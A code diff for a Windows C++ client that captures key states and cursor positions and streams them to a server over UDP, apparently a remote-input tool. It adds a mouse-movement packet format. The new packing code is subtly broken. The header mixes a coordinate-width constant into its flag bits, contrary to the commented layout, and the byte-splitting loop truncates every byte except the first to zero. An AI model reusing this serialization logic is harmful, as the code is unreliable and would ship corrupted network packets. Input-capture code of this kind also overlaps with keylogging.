@@ -244,7 +244,7 @@ std::vector<uint32_t> findChanges(const std::vector<BYTE>& currentKeys,
     // return smallResult;
     return result;
 }
-//header idea for now, first 2 bits showing what type of packet this is 00: keystrokes , 01: file transfer, 10: clipboard copying, 11:system message
+//header idea for now, first 2 bits showing what type of packet this is 00: keystrokes , 01: mouse movement, 10: file transfer, 11:system message
 //next 4 bytes are amount of keys pressed, if more than 15 keys are pressed, send 15 then send the remainder after in a seperate packet
 //next bit showing what operating system this comes from, 1 for windows, 0 for linux, going to add linux compatibility so 
 //last bit is if encoded or not. this bit can be changed for a different use later
@@ -348,6 +348,49 @@ double calculateDistance(POINT a, POINT b) {
     return sqrt(pow(a.x - b.x, 2) + pow(a.y - b.y, 2));
 }
 
+const int COORDINATE_BITS = 12;  // 12 bits for each coordinate (x and y)
+const int COORDINATE_MAX = (1 << COORDINATE_BITS) - 1; // 2^12 - 1 = 4095
+const int HEADER_SIZE = 8;       // 8 bits for the header
+const int MAX_BITS_IN_PACKET = 32; // 32 bits for the total packet size
+
+uint32_t packetizeMouseMovement(POINT cursorPos, bool isWindows, bool isEncoded) {
+    
+    if (cursorPos.x < 0 || cursorPos.x > COORDINATE_MAX) {
+        cursorPos.x = (cursorPos.x < 0) ? 0 : COORDINATE_MAX;  
+    }
+    if (cursorPos.y < 0 || cursorPos.y > COORDINATE_MAX) {
+        cursorPos.y = (cursorPos.y < 0) ? 0 : COORDINATE_MAX;  
+    }
+
+    uint32_t packet = 0;
+    int numBitsLeft = MAX_BITS_IN_PACKET;
+
+    // Header: 2 bits for packet type (01 for mouse movement), 1 bit for OS (Windows or Linux), 1 bit for encoding
+    uint8_t header = (0b01 << 6) | (isWindows << 5) | (isEncoded << 4) | COORDINATE_BITS; 
+    packet |= (header << 24); // Set the header in the first 8 bits of the packet
+    numBitsLeft -= HEADER_SIZE;  
+
+    uint32_t xCoord = cursorPos.x;
+    uint32_t yCoord = cursorPos.y;
+
+    if (numBitsLeft >= COORDINATE_BITS) {
+        packet |= (xCoord << (numBitsLeft - COORDINATE_BITS));  // Shift to the correct position
+        numBitsLeft -= COORDINATE_BITS;
+    } else {
+        packet = xCoord;
+        numBitsLeft = MAX_BITS_IN_PACKET - COORDINATE_BITS;
+    }
+
+    if (numBitsLeft >= COORDINATE_BITS) {
+        packet |= (yCoord << (numBitsLeft - COORDINATE_BITS));  
+    } else {
+        packet = yCoord; 
+    }
+
+    return packet;
+}
+
+
 
 void logMousePos(SOCKET clientUDPFD, std::atomic<bool>& running, ULONG serverAddr){
     POINT lastSentPos = { -1, -1 }; // Initialize with an invalid position
@@ -364,15 +407,15 @@ void logMousePos(SOCKET clientUDPFD, std::atomic<bool>& running, ULONG serverAdd
         if (GetCursorPos(&currentPos)) {
             // Check if the cursor has moved more than the threshold
             if (lastSentPos.x == -1 || calculateDistance(lastSentPos, currentPos) >= 5) {
-                // Update the last sent position
                 lastSentPos = currentPos;
 
-                // Format position as a string
-                std::string message = std::to_string(currentPos.x) + "," + std::to_string(currentPos.y);
+                uint32_t packet = (packetizeMouseMovement(currentPos,1,0));
+                std::vector<char> buffer(4);
+                for(int i =0; i < 4; i ++){
+                    buffer[i] = packet &( 0xFF <<((sizeof(char) * 8)*i));
+                }
 
-                // Send the message to the server
-                sendto(clientUDPFD, message.c_str(), message.size(), 0, 
-                       (sockaddr*)&server, sizeof(server));
+                sendto(clientUDPFD, buffer.data(), buffer.size(), 0, (sockaddr*)&server, sizeof(server));
             }
         }
 
